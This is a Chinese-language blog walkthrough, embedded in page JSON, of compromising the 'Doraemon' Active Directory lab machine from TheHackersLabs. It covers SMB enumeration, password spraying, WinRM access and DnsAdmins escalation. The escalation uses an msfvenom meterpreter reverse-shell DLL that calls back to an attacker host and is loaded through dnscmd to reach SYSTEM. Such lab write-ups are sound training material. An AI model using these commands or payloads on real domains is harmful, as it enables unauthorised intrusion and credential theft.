{"pageProps":{"postData":{"id":"TheHackersLabsDoraemon","contentHtml":"<h1>Doraemon</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/30\">https://labs.thehackerslabs.com/machine/30</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nmap -sn 192.168.10.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST\nNmap scan report for 192.168.10.1\nHost is up (0.00057s latency).\nMAC Address: 0A:00:27:00:00:10 (Unknown)\nNmap scan report for 192.168.10.5\nHost is up (0.00081s latency).\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.7\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.100\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds\n</code></pre>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nWarning: 192.168.10.5 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.10.5\nHost is up (0.00038s latency).\nNot shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49687/tcp open  unknown\n49705/tcp open  unknown\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nNmap scan report for 192.168.10.5\nHost is up (0.00049s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)\n|   Computer name: WIN-VRU3GG3DPLJ\n|   NetBIOS computer name: WIN-VRU3GG3DPLJ\\x00\n|   Domain name: DORAEMON.THL\n|   Forest name: DORAEMON.THL\n|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL\n|_  System time: 2025-08-03T10:53:48+02:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-03T08:53:48\n|_  start_date: 2025-08-03T08:25:53\n|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.86 seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>SMB</code> 匿名</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\anonymous: (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users\n</code></pre>\n<p>有两个文件夹有读的权限，通过模块全部读出来</p>\n<pre><code class=\"hljs language-scheme\">nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image1.png\" alt=\"image.png\"></p>\n<p>得到一个 <code>txt</code> 文件，内容：</p>\n<pre><code class=\"hljs language-scheme\">➜  gorrocoptero cat kedadawapa.txt       \nAtención al grupo especial Dorayaki1 de Estepona\n\n- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?\n\n- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?\n\n- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!\n\n- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!\n\n- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!\n\n- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.\n\n- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦\n\n- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!\n\n- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.\n\n- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!\n\n- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!\n\n- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.\n\n- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!\n\n- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!\n\n- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!\n\n- Doraemon: Â¡A comer dorayakis!\n</code></pre>\n<blockquote>\n<p>致：埃斯特波纳铜锣烧1特别组</p>\n<p>哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧怎么样？</p>\n<p>大雄：好啊！我超爱吃铜锣烧！可是……我们去哪儿买呢？</p>\n<p>静香：我听说街角开了一家新的铜锣烧店。据说是城里最好吃的！</p>\n<p>小夫：拜托。总是有新东西。我迫不及待想尝尝。希望比上一家的更大！</p>\n<p>巨人：我想要个大号的！而且要多馅儿！如果不是，我也可以去！</p>\n<p>哆啦A梦：好吧，我们可以请大雄用时光机的力量，穿越到未来，给我们带一些3000年的铜锣烧。</p>\n<p>大雄：等等！我不知道该不该用这台机器。上次我用的时候，结果把我带到了一个满是奇怪机器人的地方……</p>\n<p>静香：别担心，大雄。我们只是去商店而已。我们不用去未来。我们可以步行！</p>\n<p>小夫：听起来很无聊。不如我们来个比赛？第一个到店的人可以选择铜锣烧的口味。</p>\n<p>巨人：我喜欢这个主意！不过你得跑得快才能赢我，小夫！</p>\n<p>哆啦A梦：我们一起去怎么样？这样我们就能享受旅程了。而且，我可以用未来手机订一堆等着我们的铜锣烧！</p>\n<p>大雄：这主意太棒了，哆啦A梦！这样我就不用跑了，还能确保每个人都有足够的铜锣烧。</p>\n<p>静香：太好了！那我们去铜锣烧店吧！</p>\n<p>小夫：好的！铜锣烧，来啦！</p>\n<p>巨人：别忘了我！我要赢！</p>\n<p>——哆啦A梦：我们吃铜锣烧吧！</p>\n</blockquote>\n<h2>横向移动</h2>\n<h3>Timeroast ❌</h3>\n<pre><code class=\"hljs language-scheme\">➜  Timeroast python timeroast.py 192.168.10.5\n1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41\n</code></pre>\n<p><code>hash</code> 保存为 <code>hash.txt</code> , <code>hashcat</code> 爆破</p>\n<pre><code class=\"hljs language-scheme\">./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p>没爆破出来</p>\n<h3>域用户名枚举</h3>\n<p>可能前面的是用户名，我们将其提取出来</p>\n<pre><code class=\"hljs language-scheme\">➜  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt\n\nDoraemon\nGigante\nNobita\nShizuka\nSuneo\n</code></pre>\n<p>我们再对用户名进行测试</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\: \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo: STATUS_LOGON_FAILURE\n</code></pre>\n<p>提示 <code>STATUS_LOGON_FAILURE</code> 存在用户名，但是密码错了</p>\n<h3><strong>Kerberoast ❌</strong></h3>\n<p>再枚举 <code>Kerberoast</code></p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] invalid principal syntax\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre>\n<p>没法子，这里看了一下 <code>WP</code>，发现 txt 文件中的 <code>Dorayaki1</code> 是一个有效密码</p>\n<h3>密码喷洒</h3>\n<p>我们进行密码喷洒</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:Dorayaki1 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo:Dorayaki1 STATUS_LOGON_FAILURE\n</code></pre>\n<p>得到用户 <code>Doraemon</code> 的凭据</p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           \nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \n\n➜  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 (Pwn3d!)\n</code></pre>\n<h3>域分析</h3>\n<p>使用 <code>bloodhound-ce-python</code> 进行信息收集</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: doraemon.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250803115152_bloodhound.zip\n</code></pre>\n<p>域用户组信息</p>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image2.png\" alt=\"image.png\"></p>\n<p>在 <code>Bloodhound</code> 中没能找到什么可利用信息</p>\n<p>上 <code>winpeas</code> 能找到一个奇怪的文本文件</p>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image3.png\" alt=\"image.png\"></p>\n<p>是一个凭据</p>\n<pre><code class=\"hljs language-scheme\">*Evil-WinRM* PS C:\\> cat 'C:\\Users\\Doraemon\\Links\\Carta de amor a Shizuka.txt'\nShizuka te doy la clave de mi corazon: ShizukaTeAmobb12345\n</code></pre>\n<p>密码喷洒</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:ShizukaTeAmobb12345 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Suneo:ShizukaTeAmobb12345\n</code></pre>\n<p>是 <code>suneo</code> 的凭据，属于 <code>DNSADMINS</code> 和 <code>DORAYAKI</code> 组</p>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image4.png\" alt=\"image.png\"></p>\n<p>通过 <code>BloodyAD</code> 查看可写，有很多</p>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image5.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<p>在 <code>HackTricks</code> 中能找到利用方法：<a href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins</a></p>\n<p><strong>DnsAdmins</strong> 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 <code>DLL</code></p>\n<p>生成反弹 <code>shell</code> DLL</p>\n<pre><code class=\"hljs language-scheme\">➜  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: OMG.dll\n</code></pre>\n<p>使用以下命令使 <code>DNS</code> 服务器加载任意 <code>DLL</code></p>\n<pre><code class=\"hljs language-scheme\">*Evil-WinRM* PS C:\\tools> dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\\tools\\OMG.dll\n\nPropiedad del Registro serverlevelplugindll restablecida correctamente.\nComando completado correctamente.\n</code></pre>\n<p>然后重启服务</p>\n<pre><code class=\"hljs language-scheme\">sc.exe \\\\WIN-VRU3GG3DPLJ stop dns\nsc.exe \\\\WIN-VRU3GG3DPLJ start dns\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsDoraemon/image6.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code> 和 <code>user.txt</code></p>\n<pre><code class=\"hljs language-powershell\">C:\\Users\\Administrador\\Desktop>type root.txt\ntype root.txt\nadvcrxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Suneo\\Desktop>type user.txt\ntype user.txt\nasfrexxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Administrador\\Desktop>whoami\nwhoami\nnt authority\\system\n</code></pre>\n<h2>总结</h2>\n<p>还行，就一开始的密码没猜到</p>","title":"TheHackersLabs - Doraemon","date":"2025-08-03","updated":"2025-08-03","tags":["TheHackersLabs","Windows","DNSADmins","SMB","CVE-2021-40469"],"categories":"靶机","comments":true,"description":"Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}